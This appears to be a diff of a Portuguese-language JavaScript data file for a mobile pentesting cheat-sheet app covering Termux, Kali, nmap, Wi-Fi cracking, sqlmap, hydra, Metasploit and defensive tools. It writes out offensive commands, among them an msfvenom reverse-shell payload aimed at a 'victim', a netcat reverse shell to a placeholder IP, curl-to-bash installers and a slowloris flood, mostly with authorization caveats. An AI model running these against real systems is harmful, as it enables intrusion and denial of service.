+      <div class="step"><div class="step-n">2</div><div class="step-t">O modo DeX abre automaticamente (interface tipo desktop).</div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t">Conecte teclado e mouse via Bluetooth ou USB.</div></div>
+      <div class="step"><div class="step-n">4</div><div class="step-t">Combine com o Termux:X11/VNC para ter um Linux desktop em tela grande!</div></div>
+      <div class="alert alert-ok">✅ Sem root, nativo. Só em Samsung (ou Android com modo desktop).</div>
+    `
+  }
+};
+
+// ============================================================
+// DADOS: COMANDOS (Termux + ferramentas)
+// ============================================================
+const COMMANDS = [
+  { c:"termux_setup", i:"\ud83d\udda5\ufe0f", n:"Baixar e instalar o i-Haklab (laborat\u00f3rio de hacking)", d:"Laborat\u00f3rio de pentest com +100 ferramentas. Use apenas em redes/dispositivos pr\u00f3prios ou com autoriza\u00e7\u00e3o.",
+    tags:["i-haklab", "hacking lab", "instalar", "pentest tools"],
+    s:["Comando: <code>pkg update && pkg upgrade -y</code>", "Atualize os pacotes: pkg update && pkg upgrade -y", "Instale o curl e o git: pkg install -y curl git", "Rode o instalador oficial (recomendado): curl -fsSL \"https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/install.sh\" | bash", "Ou, pela via de clone: git clone https://github.com/ivam3/i-Haklab && cd i-Haklab && chmod +x setup && bash setup", "Depois de instalar, rode: i-Haklab (ou i-Haklab about <ferramenta> para ajuda)", "Liste as ferramentas com: i-Haklab show alltools"] },
+  { c:"termux_setup", i:"\ud83d\udda5\ufe0f", n:"Instalar e entrar no Kali dentro do Termux", d:"\ud83d\udca1 A forma de entrar varia: nh, nh -r, kali ou nethunter. Verifique a sua.",
+    tags:["instalar kali", "nethunter", "configurar termux", "nh -r"],
+    s:["Comando: <code>pkg update && pkg upgrade -y</code>", "Abra o Termux e rode: pkg update && pkg upgrade -y", "Instale o wget: pkg install wget -y", "Baixe o instalador: wget -O install-nethunter-termux https://offs.ec/2MceZbN", "Dê permissão: chmod +x install-nethunter-termux", "Execute: ./install-nethunter-termux -l", "Para entrar no Kali depois: use nh -r (root) ou kali/nethunter.", "Dentro do Kali use apt para instalar ferramentas."] },
+  { c:"termux_setup", i:"\ud83d\udda5\ufe0f", n:"Entrar no Kali modo gr\u00e1fico (KEX)", d:"Entre no Kali: nh -r",
+    tags:["nethunter", "kex", "modo grafico", "kali gui"],
+    s:["Comando: <code>nh -r</code>", "Entre no Kali: nh -r", "Inicie o gráfico: nethunter kex start", "Guarde a senha VNC que aparecer.", "Para parar: nethunter kex stop."] },
+  { c:"termux_setup", i:"\ud83d\udda5\ufe0f", n:"Atualizar o Kali (dentro do ambiente)", d:"Entre no Kali com nh -r.",
+    tags:["atualizar kali", "upgrade", "apt"],
+    s:["Comando: <code>sudo apt update && sudo apt full-upgrade -y</code>", "Entre no Kali com nh -r.", "Rode: sudo apt update && sudo apt full-upgrade -y", "Confirme com 'y' quando pedir.", "Reinicie se o kernel mudar."] },
+  { c:"rede", i:"\ud83d\udce1", n:"nmap - Descobrir hosts ativos na rede", d:"\ud83d\udca1 Somente em redes pr\u00f3prias ou autorizadas.",
+    tags:["nmap", "escanear rede", "hosts ativos", "descobrir"],
+    s:["Comando: <code>nmap -sn 192.168.1.0/24</code>", "Descubra seu IP: ip a", "Use sua rede (ex: 192.168.1.0/24).", "Rode: nmap -sn 192.168.1.0/24", "Veja a lista de IPs ativos e MACs."] },
+  { c:"rede", i:"\ud83d\udce1", n:"nmap - Scan de portas e vers\u00f5es", d:"Defina o alvo (IP).",
+    tags:["nmap", "portas", "servicos", "scan de portas"],
+    s:["Comando: <code>nmap -sV -p- 192.168.1.10</code>", "Defina o alvo (IP).", "Rode: nmap -sV -p- 192.168.1.10", "-sV detecta versões; -p- todas as portas.", "Analise: porta, serviço, versão."] },
+  { c:"rede", i:"\ud83d\udce1", n:"nmap - Scan agressivo (SO + scripts)", d:"Rode: nmap -A -T4 192.168.1.10",
+    tags:["nmap", "agressivo", "sistema operacional", "os"],
+    s:["Comando: <code>nmap -A -T4 192.168.1.10</code>", "Rode: nmap -A -T4 192.168.1.10", "-A: SO, versões, scripts, traceroute.", "-T4: velocidade alta.", "Veja a seção OS CPE."] },
+  { c:"rede", i:"\ud83d\udce1", n:"tcpdump - Capturar pacotes", d:"\ud83d\udca1 Pode exigir root (nh -r).",
+    tags:["tcpdump", "sniffar", "capturar pacotes", "pcap"],
+    s:["Comando: <code>tcpdump -i wlan0 -w captura.pcap</code>", "Identifique a interface: ip addr", "Rode: tcpdump -i wlan0 -w captura.pcap", "Pare com Ctrl+C.", "Analise com tshark/wireshark depois."] },
+  { c:"rede", i:"\ud83d\udce1", n:"traceroute - Rota at\u00e9 um host", d:"Rode: traceroute -n alvo.com",
+    tags:["traceroute", "rota", "rastrear"],
+    s:["Comando: <code>traceroute -n alvo.com</code>", "Rode: traceroute -n alvo.com", "Mostra os saltos até o destino.", "Use -n para não resolver DNS (mais rápido)."] },
+  { c:"rede", i:"\ud83d\udce1", n:"mtr - Diagn\u00f3stico de rede em tempo real", d:"Rode: mtr alvo.com",
+    tags:["mtr", "diagnostico", "ping", "traceroute"],
+    s:["Comando: <code>mtr alvo.com</code>", "Rode: mtr alvo.com", "Combina ping + traceroute.", "Observe perda de pacotes e latência por salto."] },
+  { c:"wifi", i:"\ud83d\udcf6", n:"wifite - Ataque wifi automatizado", d:"\ud83d\udca1 Requer modo monitor (root + chipset compat\u00edvel).",
+    tags:["wifite", "hackear wifi", "wpa", "wifi automatico"],
+    s:["Comando: <code>sudo wifite</code>", "Coloque a interface em modo monitor (se suportar).", "Rode: sudo wifite", "Ele lista as redes ao redor.", "Selecione o alvo para capturar handshake.", "Use uma wordlist quando pedir.", "Somente em redes próprias/autoriadas."] },
+  { c:"wifi", i:"\ud83d\udcf6", n:"aircrack-ng - Quebrar WPA/WPA2", d:"Capture o handshake (precisa modo monitor).",
+    tags:["aircrack-ng", "quebrar senha", "wpa2", "handshake"],
+    s:["Comando: <code>aircrack-ng -w wordlist.txt -b <BSSID> captura.cap</code>", "Capture o handshake (precisa modo monitor).", "Use uma wordlist (ex: rockyou.txt).", "Rode: aircrack-ng -w wordlist.txt -b <BSSID> captura.cap", "Aguarde testar as senhas."] },
+  { c:"wifi", i:"\ud83d\udcf6", n:"airmon-ng - Ativar modo monitor", d:"\ud83d\udca1 Exige root + chipset que suporte modo monitor.",
+    tags:["airmon-ng", "modo monitor", "interface"],
+    s:["Comando: <code>sudo airmon-ng start wlan0</code>", "Rode: sudo airmon-ng start wlan0", "A interface vira wlan0mon.", "Use airodump-ng para capturar.", "Volte ao normal: sudo airmon-ng stop wlan0mon."] },
+  { c:"ataques_web", i:"\ud83c\udf10", n:"gobuster - Descobrir diret\u00f3rios", d:"Tenha uma wordlist (ex: /usr/share/wordlists/dirb/common.txt).",
+    tags:["gobuster", "diretorios", "fuzzing", "pastas"],
+    s:["Comando: <code>gobuster dir -u http://alvo.com -w wordlist.txt</code>", "Tenha uma wordlist (ex: /usr/share/wordlists/dirb/common.txt).", "Rode: gobuster dir -u http://alvo.com -w wordlist.txt", "Código 200 = diretório existe.", "Use -x php,html para filtrar extensões."] },
+  { c:"ataques_web", i:"\ud83c\udf10", n:"sqlmap - Testar SQL Injection", d:"\ud83d\udca1 S\u00f3 em sites que voc\u00ea controla ou autorizou.",
+    tags:["sqlmap", "sql injection", "banco", "injeção"],
+    s:["Comando: <code>sqlmap -u \"http://alvo.com/page?id=1\" --dbs</code>", "Encontre um parâmetro na URL (ex: id=1).", "Rode: sqlmap -u \"http://alvo.com/page?id=1\" --dbs", "Confirme com 'y' quando perguntar.", "--dbs lista bancos de dados.", "Depois use --tables e --dump."] },
+  { c:"ataques_web", i:"\ud83c\udf10", n:"wpscan - Escanear WordPress", d:"Rode: wpscan --url http://alvo.com --enumerate",
+    tags:["wpscan", "wordpress", "plugin", "usuario"],
+    s:["Comando: <code>wpscan --url http://alvo.com --enumerate</code>", "Rode: wpscan --url http://alvo.com --enumerate", "Lista plugins, temas e usuários.", "Use --api-token <chave> para vulnerabilidades.", "Anote plugins desatualizados."] },
+  { c:"ataques_web", i:"\ud83c\udf10", n:"nikto - Scanner de vulnerabilidades web", d:"Rode: nikto -h http://alvo.com",
+    tags:["nikto", "scanner web", "vulnerabilidades"],
+    s:["Comando: <code>nikto -h http://alvo.com</code>", "Rode: nikto -h http://alvo.com", "Ele verifica falhas comuns do servidor web.", "Analise o relatório gerado."] },
+  { c:"ataques_web", i:"\ud83c\udf10", n:"\u26a0\ufe0f XSS \u2014 DEFESA", d:"Inje\u00e7\u00e3o de script em p\u00e1ginas. Foco em PREVEN\u00c7\u00c3O.",
+    tags:["xss", "cross site", "script", "injetar"],
+    s:["Entenda: scripts injetados executam no navegador da vítima.", "Defesa: sanitize e valide toda entrada de dados.", "Defesa: use Content-Security-Policy (CSP).", "Defesa: escape a saída HTML e use cookies HttpOnly.", "⚠️ Explorar sites de terceiros é crime."] },
+  { c:"ataques_web", i:"\ud83c\udf10", n:"dirb - Scanner de diret\u00f3rios web", d:"Rode: dirb http://alvo.com <wordlist>",
+    tags:["dirb", "diretorios", "scanner"],
+    s:["Comando: <code>dirb http://alvo.com /usr/share/wordlists/dirb/common.txt</code>", "Rode: dirb http://alvo.com <wordlist>", "Encontra diretórios e arquivos escondidos."] },
+  { c:"ataques_web", i:"\ud83c\udf10", n:"whatweb - Identificar tecnologia do site", d:"Rode: whatweb http://alvo.com",
+    tags:["whatweb", "tecnologia", "cms", "fingerprint"],
+    s:["Comando: <code>whatweb http://alvo.com</code>", "Rode: whatweb http://alvo.com", "Mostra CMS, servidor, framework.", "Ótimo para reconhecimento."] },
+  { c:"ataques_web", i:"\ud83c\udf10", n:"\u26a0\ufe0f Inunda\u00e7\u00e3o de pacotes \u2014 DEFESA", d:"Envio massivo de pacotes para esgotar recursos. Foco defensivo.",
+    tags:["ddos", "flood", "hping3", "pacotes"],
+    s:["Entenda: sobrecarrega a rede/dispositivo com pacotes.", "Defesa: rate limiting e QoS no roteador.", "Defesa: port security e proteção contra MAC flood.", "Defesa: monitoramento de tráfego anômalo.", "⚠️ Atacar redes alheias é crime."] },
+  { c:"senhas", i:"\ud83d\udd11", n:"hydra - For\u00e7a bruta em logins", d:"Tenha listas de usu\u00e1rios (-L) e senhas (-P).",
+    tags:["hydra", "forca bruta", "quebrar senha", "ssh"],
+    s:["Comando: <code>hydra -L usuarios.txt -P senhas.txt ssh://192.168.1.10</code>", "Tenha listas de usuários (-L) e senhas (-P).", "Rode: hydra -L usuarios.txt -P senhas.txt ssh://192.168.1.10", "Escolha o protocolo: ssh, ftp, rdp, smb...", "Veja o par usuário:senha encontrado."] },
+  { c:"senhas", i:"\ud83d\udd11", n:"john - Quebrar hash de senha", d:"Coloque o hash em hash.txt.",
+    tags:["john", "crackear hash", "rockyou"],
+    s:["Comando: <code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code>", "Coloque o hash em hash.txt.", "Rode: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", "Aguarde.", "Veja: john --show hash.txt"] },
+  { c:"senhas", i:"\ud83d\udd11", n:"hashcat - Quebrar hash com GPU/CPU", d:"Descubra o modo (-m). MD5=0, SHA1=100, NTLM=1000.",
+    tags:["hashcat", "crack", "gpu", "modo"],
+    s:["Comando: <code>hashcat -m 0 -a 0 hash.txt rockyou.txt</code>", "Descubra o modo (-m). MD5=0, SHA1=100, NTLM=1000.", "Rode: hashcat -m 0 -a 0 hash.txt rockyou.txt", "-a 0 = dicionário, -a 3 = bruto.", "Veja a senha encontrada."] },
+  { c:"senhas", i:"\ud83d\udd11", n:"cewl - Gerar wordlist de um site", d:"Rode: cewl http://alvo.com -w wordlist.txt",
+    tags:["cewl", "wordlist site", "gerar senha"],
+    s:["Comando: <code>cewl http://alvo.com -w wordlist.txt</code>", "Rode: cewl http://alvo.com -w wordlist.txt", "Extrai palavras do site.", "Use -d (profundidade) e -m (tamanho mínimo).", "Gera wordlist personalizada."] },
+  { c:"senhas", i:"\ud83d\udd11", n:"crunch - Gerar wordlist por combina\u00e7\u00f5es", d:"Rode: crunch 6 8 abc123 -o wordlist.txt",
+    tags:["crunch", "wordlist", "combinacoes"],
+    s:["Comando: <code>crunch 6 8 abc123 -o wordlist.txt</code>", "Rode: crunch 6 8 abc123 -o wordlist.txt", "6-8 = tamanho mínimo-máximo; abc123 = charset.", "Gera todas as combinações possíveis."] },
+  { c:"explora_o", i:"\ud83d\udca5", n:"Metasploit - Buscar e usar exploits", d:"Entre: msfconsole",
+    tags:["metasploit", "exploit", "msfconsole"],
+    s:["Comando: <code>msfconsole</code>", "Entre: msfconsole", "Busque: search nome", "Use: use exploit/...", "Configure: set RHOSTS, set LHOST", "Rode: run", "Sessão: sessions -i 1."] },
+  { c:"explora_o", i:"\ud83d\udca5", n:"msfvenom - Gerar payload", d:"Substitua SEU_IP pelo seu IP.",
+    tags:["msfvenom", "payload", "shell reverso", "meterpreter"],
+    s:["Comando: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f exe > shell.exe</code>", "Substitua SEU_IP pelo seu IP.", "Rode o comando msfvenom.", "No Metasploit: use multi/handler, set payload, LHOST, LPORT.", "Quando a vítima rodar, você pega a sessão.", "Somente em teste autorizado."] },
+  { c:"explora_o", i:"\ud83d\udca5", n:"netcat (nc) - Portas e shell reverso", d:"Ouvir: nc -lvnp 4444",
+    tags:["netcat", "nc", "shell reverso", "porta"],
+    s:["Comando: <code>nc -lvnp 4444   # ouvir</code>", "Ouvir: nc -lvnp 4444", "Conectar: nc alvo.com 4444", "Shell no alvo: nc SEU_IP 4444 -e /bin/sh", "Transferir: nc alvo 4444 < arquivo"] },
+  { c:"enumera_o", i:"\ud83d\udd0e", n:"enum4linux - Enumerar SMB/Windows", d:"Rode: enum4linux -a 192.168.1.10",
+    tags:["enum4linux", "smb", "windows", "compartilhamento"],
+    s:["Comando: <code>enum4linux -a 192.168.1.10</code>", "Rode: enum4linux -a 192.168.1.10", "Coleta usuários, compartilhamentos, políticas.", "Uso autorizado."] },
+  { c:"enumera_o", i:"\ud83d\udd0e", n:"dnsenum - Enumerar DNS", d:"Rode: dnsenum alvo.com",
+    tags:["dnsenum", "dns", "subdominio"],
+    s:["Comando: <code>dnsenum alvo.com</code>", "Rode: dnsenum alvo.com", "Coleta subdomínios e servidores DNS."] },
+  { c:"enumera_o", i:"\ud83d\udd0e", n:"whois - Informa\u00e7\u00f5es de dom\u00ednio", d:"Rode: whois alvo.com",
+    tags:["whois", "dominio", "informacao", "osint"],
+    s:["Comando: <code>whois alvo.com</code>", "Rode: whois alvo.com", "Mostra dono, datas, servidores DNS.", "Ótimo para OSINT."] },
+  { c:"anonimato", i:"\ud83d\udd76\ufe0f", n:"tor + proxychains - Navega\u00e7\u00e3o an\u00f4nima", d:"Instale: pkg install tor proxychains-ng -y",
+    tags:["tor", "proxychains", "anonimo", "proxy"],
+    s:["Comando: <code>tor &</code>", "Instale: pkg install tor proxychains-ng -y", "Inicie o Tor: tor &", "Use: proxychains curl http://alvo.com", "O tráfego passa pela rede Tor."] },
+  { c:"forense", i:"\ud83e\udde9", n:"foremost - Recuperar arquivos", d:"Rode: foremost -i imagem.dd -o saida/",
+    tags:["foremost", "recuperar arquivos", "apagados"],
+    s:["Comando: <code>foremost -i imagem.dd -o saida/</code>", "Rode: foremost -i imagem.dd -o saida/", "Recupera arquivos apagados de imagem de disco."] },
+  { c:"criptografia", i:"\ud83d\udd10", n:"openssl - Criptografar arquivo (AES-256)", d:"Rode o comando openssl enc.",
+    tags:["openssl", "criptografar", "aes", "arquivo"],
+    s:["Comando: <code>openssl enc -aes-256-cbc -salt -in arquivo.txt -out arquivo.enc</code>", "Rode o comando openssl enc.", "Digite a senha.", "Para voltar: openssl enc -d -aes-256-cbc -in arquivo.enc -out arquivo.txt", "Guarde a senha."] },
+  { c:"criptografia", i:"\ud83d\udd10", n:"openssl - Gerar hash de arquivo", d:"Rode: openssl dgst -sha256 arquivo.txt",
+    tags:["openssl", "hash", "sha256", "checksum"],
+    s:["Comando: <code>openssl dgst -sha256 arquivo.txt</code>", "Rode: openssl dgst -sha256 arquivo.txt", "Mostra o hash SHA-256.", "Use para verificar integridade."] },
+  { c:"criptografia", i:"\ud83d\udd10", n:"gpg - Criptografar e assinar", d:"Gere chaves: gpg --full-generate-key",
+    tags:["gpg", "criptografar", "chave", "assinar"],
+    s:["Comando: <code>gpg --full-generate-key</code>", "Gere chaves: gpg --full-generate-key", "Criptografe: gpg --encrypt --recipient email@ex.com arquivo.txt", "Assine: gpg --sign arquivo.txt", "Descriptografe: gpg --decrypt arquivo.gpg"] },
+  { c:"an_lise_de_malware", i:"\ud83e\udda0", n:"ClamAV - Escanear arquivos por v\u00edrus", d:"Atualize: sudo freshclam",
+    tags:["clamav", "antivirus", "escanear", "virus"],
+    s:["Comando: <code>sudo freshclam</code>", "Atualize: sudo freshclam", "Escanear: sudo clamscan -r /caminho", "Use --infected para só infectados.", "Veja o relatório."] },
+  { c:"an_lise_de_malware", i:"\ud83e\udda0", n:"yara - Detectar malware com regras", d:"Crie o arquivo regra.yar.",
+    tags:["yara", "regra", "detectar"],
+    s:["Comando: <code>yara regra.yar arquivo_suspeito</code>", "Crie o arquivo regra.yar.", "Rode: yara regra.yar arquivo_suspeito", "Se detectar, imprime nome+arquivo.", "Use -r para pastas."] },
+  { c:"an_lise_de_malware", i:"\ud83e\udda0", n:"strings - Extrair textos de um bin\u00e1rio", d:"Rode: strings arquivo_suspeito.exe",
+    tags:["strings", "binario", "texto", "analisar"],
+    s:["Comando: <code>strings arquivo_suspeito.exe | less</code>", "Rode: strings arquivo_suspeito.exe", "Pagine com | less.", "Procure URLs, caminhos, comandos."] },
+  { c:"an_lise_de_malware", i:"\ud83e\udda0", n:"binwalk - Analisar arquivo bin\u00e1rio", d:"Rode: binwalk -e arquivo.bin",
+    tags:["binwalk", "firmware", "analisar"],
+    s:["Comando: <code>binwalk -e arquivo.bin</code>", "Rode: binwalk -e arquivo.bin", "Analisa e extrai conteúdo embutido."] },
+  { c:"pen_testing_python", i:"\ud83d\udc0d", n:"impacket - Pentest em Windows/AD", d:"impacket-psexec user:senha@IP \u2014 shell remoto via SMB.",
+    tags:["impacket", "smb", "psexec", "secretsdump"],
+    s:["Comando: <code>impacket-psexec usr:pass@10.0.0.1</code>", "impacket-psexec user:senha@IP — shell remoto via SMB.", "impacket-secretsdump user:senha@IP — extrair hashes.", "Outros: wmiexec, GetUserSPNs, mssqlclient.", "Somente em ambiente autorizado."] },
+  { c:"pen_testing_python", i:"\ud83d\udc0d", n:"pwntools - Lib Python de exploit/CTF", d:"Instale: pip install pwntools",
+    tags:["pwntools", "exploit", "ctf", "binario"],
+    s:["Comando: <code>python3 -c \"from pwn import *; r=remote('host',1337); r.interactive()\"</code>", "Instale: pip install pwntools", "Conecte: from pwn import *; r=remote('host',porta)", "Envie: r.sendline(...); r.interactive()", "Use cyclic() para achar offsets em CTF."] },
+  { c:"ia_local", i:"\ud83e\udd16", n:"ollama - Rodar IA localmente", d:"Instale: curl -fsSL https://ollama.com/install.sh | sh",
+    tags:["ollama", "ia", "local", "qwen"],
+    s:["1. Atualize os pacotes: <code>pkg update && pkg upgrade -y</code>", "2. Instale o Ollama no Termux: <code>pkg install ollama -y</code>", "   (Alternativa em Linux/proot: <code>curl -fsSL https://ollama.com/install.sh | sh</code>)", "3. Verifique: <code>ollama --version</code>", "4. Inicie o servidor em segundo plano: <code>ollama serve &</code>", "5. Baixe um modelo leve (bom para celular): <code>ollama pull qwen2.5-coder:1.5b</code>", "6. Rode e converse no terminal: <code>ollama run qwen2.5-coder:1.5b</code>", "7. Liste os modelos instalados: <code>ollama list</code>", "8. Use pela API local: <code>curl http://localhost:11434/api/generate -d \"{\\\"model\\\":\\\"qwen2.5-coder:1.5b\\\",\\\"prompt\\\":\\\"Olá\\\"}\"</code>", "9. Outros modelos leves: <code>ollama pull llama3.2:1b</code>, <code>phi3</code>, <code>mistral</code>", "💡 Roda 100% offline, sem enviar dados para fora. Prefira modelos de 1B–3B no celular."] },
+  { c:"bloqueio_defesa", i:"\ud83d\udee1\ufe0f", n:"ufw - Firewall simples", d:"Ative: sudo ufw enable",
+    tags:["ufw", "firewall", "bloquear porta"],
+    s:["Comando: <code>sudo ufw enable</code>", "Ative: sudo ufw enable", "Libere: sudo ufw allow 22", "Bloqueie: sudo ufw deny 23", "Veja: sudo ufw status verbose"] },
+  { c:"bloqueio_defesa", i:"\ud83d\udee1\ufe0f", n:"iptables - Bloquear um IP", d:"Troque 1.2.3.4 pelo IP a bloquear.",
+    tags:["iptables", "bloquear ip", "regra"],
+    s:["Comando: <code>sudo iptables -A INPUT -s 1.2.3.4 -j DROP</code>", "Troque 1.2.3.4 pelo IP a bloquear.", "Rode o comando iptables.", "Liste: sudo iptables -L -n", "Remova com -D."] },
+  { c:"bloqueio_defesa", i:"\ud83d\udee1\ufe0f", n:"netstat - Ver conex\u00f5es ativas", d:"Rode: netstat -tunap",
+    tags:["netstat", "conexoes", "portas", "monitor"],
+    s:["Comando: <code>netstat -tunap</code>", "Rode: netstat -tunap", "-t TCP, -u UDP, -n sem DNS, -a todas, -p processo.", "Procure conexões suspeitas.", "Ótimo para detectar intrusão."] },
+  { c:"bloqueio_defesa", i:"\ud83d\udee1\ufe0f", n:"lynis - Auditoria de seguran\u00e7a", d:"Rode: sudo lynis audit system",
+    tags:["lynis", "auditoria", "seguranca"],
+    s:["Comando: <code>sudo lynis audit system</code>", "Rode: sudo lynis audit system", "Testa dezenas de controles.", "Mostra pontuação e correções.", "Relatório em /var/log/lynis.log"] },
+  { c:"bloqueio_defesa", i:"\ud83d\udee1\ufe0f", n:"chkrootkit - Detectar rootkits", d:"Rode: sudo chkrootkit",
+    tags:["chkrootkit", "rootkit", "detectar"],
+    s:["Comando: <code>sudo chkrootkit</code>", "Rode: sudo chkrootkit", "Varre por rootkits.", "Se achar, isole o dispositivo."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"Tool-X - Instalar ferramentas de hacking", d:"Clone: git clone .../Tool-X.git",
+    tags:["tool-x", "instalar ferramentas", "installer"],
+    s:["Comando: <code>git clone https://github.com/rajkumardusad/Tool-X.git</code>", "Clone: git clone .../Tool-X.git", "Entre: cd Tool-X", "Permissão: chmod +x install", "Rode: ./install", "Escolha a ferramenta no menu."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"\u26a0\ufe0f Phishing \u2014 conscientiza\u00e7\u00e3o", d:"Clonagem de p\u00e1ginas para roubar credenciais. Use s\u00f3 para TREINAMENTO autorizado.",
+    tags:["cyberphish", "phishing", "pagina login"],
+    s:["Entenda: página falsa imita um site real para capturar login.", "Defesa: verifique sempre a URL antes de digitar senha.", "Defesa: ative 2FA (mesmo com senha roubada, dificulta).", "Defesa: treine sua equipe/família a reconhecer golpes.", "⚠️ Usar phishing contra pessoas é crime."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"Bettercap - Man-in-the-middle", d:"Rode: sudo bettercap -iface wlan0",
+    tags:["bettercap", "mitm", "arp", "interceptar"],
+    s:["Comando: <code>sudo bettercap -iface wlan0</code>", "Rode: sudo bettercap -iface wlan0", "Use ARP spoofing e sniffing.", "Somente em rede própria/autoriada."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"macchanger - Trocar endere\u00e7o MAC", d:"Rode: sudo macchanger -r wlan0",
+    tags:["macchanger", "mac", "spoofar"],
+    s:["Comando: <code>sudo macchanger -r wlan0</code>", "Rode: sudo macchanger -r wlan0", "Troca o MAC aleatoriamente.", "Use para anonimato/testes."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"sherlock - Buscar usu\u00e1rio em redes sociais", d:"Rode: sherlock nomedousuario",
+    tags:["sherlock", "redes sociais", "usuario"],
+    s:["Comando: <code>sherlock nomedousuario</code>", "Rode: sherlock nomedousuario", "Verifica dezenas de redes sociais.", "Mostra onde o nome existe."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"shodan - Buscar dispositivos na internet", d:"Inicie com API key: shodan init SUA_API_KEY",
+    tags:["shodan", "buscar servidores", "internet"],
+    s:["Comando: <code>shodan init SUA_API_KEY</code>", "Inicie com API key: shodan init SUA_API_KEY", "Busque: shodan search apache country:BR", "Use filtros: country, port, os, product."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"findomain - Descobrir subdom\u00ednios", d:"Rode: findomain -t alvo.com",
+    tags:["findomain", "subdominio", "descobrir"],
+    s:["Comando: <code>findomain -t alvo.com</code>", "Rode: findomain -t alvo.com", "Descobre subdomínios por várias fontes."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"recon-ng - Framework de OSINT", d:"Rode: recon-ng",
+    tags:["recon-ng", "osint", "framework"],
+    s:["Comando: <code>recon-ng</code>", "Rode: recon-ng", "Use marketplaceto / modules search.", "Carregue módulos de coleta."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"tshark - Wireshark no terminal", d:"Rode: tshark -i wlan0",
+    tags:["tshark", "wireshark", "pcap"],
+    s:["Comando: <code>tshark -i wlan0</code>", "Rode: tshark -i wlan0", "Captura e analisa pacotes no terminal.", "Use -r arquivo.pcap para ler arquivo."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"\u26a0\ufe0f Keylogger \u2014 DEFESA e detec\u00e7\u00e3o", d:"Programa que captura teclas. Apresentado para voc\u00ea DETECTAR e se proteger.",
+    tags:["keylogger", "teclas", "capturar"],
+    s:["Entenda: registra o que é digitado para roubar senhas.", "Defesa: nunca instale apps/APKs desconhecidos.", "Defesa: revise permissões de acessibilidade dos apps.", "Defesa: use antivírus e 2FA em todas as contas.", "⚠️ Espionar alguém é crime."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"wfuzz - Fuzzing web", d:"Rode: wfuzz -w wordlist.txt http://alvo.com/FUZZ",
+    tags:["wfuzz", "fuzzing", "parametro"],
+    s:["Comando: <code>wfuzz -w wordlist.txt http://alvo.com/FUZZ</code>", "Rode: wfuzz -w wordlist.txt http://alvo.com/FUZZ", "Testa diretórios/parâmetros.", "Uso autorizado."] },
+  { c:"mais_ferramentas", i:"\ud83e\uddf0", n:"slowloris - Esgotar conex\u00f5es", d:"Rode: slowloris -v -n 5000 -t 100 alvo.com",
+    tags:["slowloris", "ddos", "conexoes"],
+    s:["Comando: <code>slowloris -v -n 5000 -t 100 alvo.com</code>", "Rode: slowloris -v -n 5000 -t 100 alvo.com", "Abre conexões lentas.", "Somente em teste autorizado."] },
+  { c:"engenharia_social", i:"\ud83c\udfad", n:"\u26a0\ufe0f Phishing \u2014 conscientiza\u00e7\u00e3o", d:"Clonagem de p\u00e1ginas para roubar credenciais. Use s\u00f3 para TREINAMENTO autorizado.",
+    tags:["set", "social engineering", "phishing", "clonar site"],
+    s:["Entenda: página falsa imita um site real para capturar login.", "Defesa: verifique sempre a URL antes de digitar senha.", "Defesa: ative 2FA (mesmo com senha roubada, dificulta).", "Defesa: treine sua equipe/família a reconhecer golpes.", "⚠️ Usar phishing contra pessoas é crime."] },
+  { c:"engenharia_social", i:"\ud83c\udfad", n:"\u26a0\ufe0f BeEF \u2014 DEFESA", d:"Framework de ataque ao navegador. Foco em conscientiza\u00e7\u00e3o.",
+    tags:["beef", "xss framework", "browser"],
+    s:["Entenda: controla navegadores que visitam uma página comprometida.", "Defesa: mantenha navegador e plugins atualizados.", "Defesa: não clique em links suspeitos.", "Defesa: use bloqueadores de script e CSP.", "⚠️ Atacar usuários é crime."] },
+  { c:"engenharia_social", i:"\ud83c\udfad", n:"\u26a0\ufe0f Phishing \u2014 conscientiza\u00e7\u00e3o", d:"Clonagem de p\u00e1ginas para roubar credenciais. Use s\u00f3 para TREINAMENTO autorizado.",
+    tags:["gophish", "campanha phishing", "email"],
+    s:["Entenda: página falsa imita um site real para capturar login.", "Defesa: verifique sempre a URL antes de digitar senha.", "Defesa: ative 2FA (mesmo com senha roubada, dificulta).", "Defesa: treine sua equipe/família a reconhecer golpes.", "⚠️ Usar phishing contra pessoas é crime."] },
+  { c:"spyware_espionagem", i:"\ud83d\udc41\ufe0f", n:"\u26a0\ufe0f Keylogger \u2014 DEFESA e detec\u00e7\u00e3o", d:"Programa que captura teclas. Apresentado para voc\u00ea DETECTAR e se proteger.",
+    tags:["keylogger", "capturar teclas", "xinput"],
+    s:["Entenda: registra o que é digitado para roubar senhas.", "Defesa: nunca instale apps/APKs desconhecidos.", "Defesa: revise permissões de acessibilidade dos apps.", "Defesa: use antivírus e 2FA em todas as contas.", "⚠️ Espionar alguém é crime."] },
+  { c:"spyware_espionagem", i:"\ud83d\udc41\ufe0f", n:"scrot - Capturar tela", d:"Instale: apt install scrot -y",
+    tags:["screen capture", "tirar screenshot", "scrot"],
+    s:["Comando: <code>scrot /tmp/screen.png</code>", "Instale: apt install scrot -y", "Rode: scrot /tmp/screen.png para capturar a tela.", "Use scrot -d 5 para capturar após 5s (timer).", "Use em seus próprios dispositivos."] },
+  { c:"spyware_espionagem", i:"\ud83d\udc41\ufe0f", n:"fswebcam - Capturar imagem da webcam", d:"Instale: sudo apt install fswebcam",
+    tags:["webcam", "camera", "capturar imagem"],
+    s:["Comando: <code>fswebcam /tmp/foto.jpg</code>", "Instale: sudo apt install fswebcam", "Rode: fswebcam /tmp/foto.jpg", "Especifique device: fswebcam -d /dev/video0 foto.jpg", "Use apenas em equipamentos próprios."] },
